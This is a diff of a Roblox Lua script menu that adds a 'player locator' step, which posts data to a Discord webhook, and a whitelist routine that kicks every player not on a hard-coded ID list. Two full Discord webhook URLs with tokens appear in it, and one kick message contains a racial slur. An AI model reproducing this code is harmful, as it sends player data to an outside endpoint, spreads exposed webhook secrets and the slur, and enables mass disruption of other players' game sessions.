@@ -1406,6 +1406,7 @@ local StatSection = StatTab:NewSection("Creado por Manzana");
 local TSection = TTab:NewSection("Creado por Manzana");
 local MSection = MTab:NewSection("Creado por Manzana");
 local KSection = KTab:NewSection("Creado por Manzana");
+--MENU 2 llevar id al discord
 --Menu localizador de jugador
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -1487,8 +1488,52 @@ local function sendWebhook(webhookUrl, data)
 end
 
 -- Replace the webhook URL with your own URL
-local webhookUrl = "https://discord.com/api/webhooks/1256014374133436427/BEaGTTxC7FP34L1CLYUsUYIVT-fBL_uxfkilkQHaYZ2DTPZcltBduDRJw6tikPLDq2j6"
+local webhookUrl = "https://discord.com/api/webhooks/1266790810398101595/FBi5ykB0aBM96UuUv7P4xsiizBc0kqjQGJiGJLmP5SrjYlf-Frl7U4JvhOZiMqTlJurH"
 local webhookData = createWebhookData()
 
 -- Sending the webhook
 sendWebhook(webhookUrl, webhookData)
+
+--Menu AVANZADO PARA LOCALIZAR GENTE METODO WHITHELIST EXPULSAR A TODOS EXCEPTO A LOS DE LISTA BLANCA
+-- Lista de IDs de usuarios permitidos (whitelist)
+local whitelist = {
+    1867007462, -- Reemplaza estos IDs con los IDs de usuario reales
+    2379966255,
+    3505058382,
+    5087536946,
+    5200276165,
+    4777114698,
+    5041537428,
+    3241219094,
+    3617721451,
+    4331040524
+}
+
+-- Función para verificar si un jugador está en la lista blanca
+local function isPlayerInWhitelist(player)
+    for _, id in ipairs(whitelist) do
+        if player.UserId == id then
+            return true
+        end
+    end
+    return false
+end
+
+-- Función que se ejecuta cuando un jugador se une al juego
+local function onPlayerAdded(player)
+    if not isPlayerInWhitelist(player) then
+        print(player.Name .. " NO está en la lista blanca. Expulsado del juego.")
+        player:Kick("No estás en la lista blanca para acceder a este servidor.")
+    end
+end
+
+-- Conecta la función al evento de jugador agregado
+game.Players.PlayerAdded:Connect(onPlayerAdded)
+
+-- Expulsa a los jugadores que ya están en el servidor cuando se ejecuta el script
+for _, player in ipairs(game.Players:GetPlayers()) do
+    if not isPlayerInWhitelist(player) then
+        print(player.Name .. " NO está en la lista blanca. Expulsado del juego.")
+        player:Kick("EZ BAN LOL NIGGA")
+    end
+end
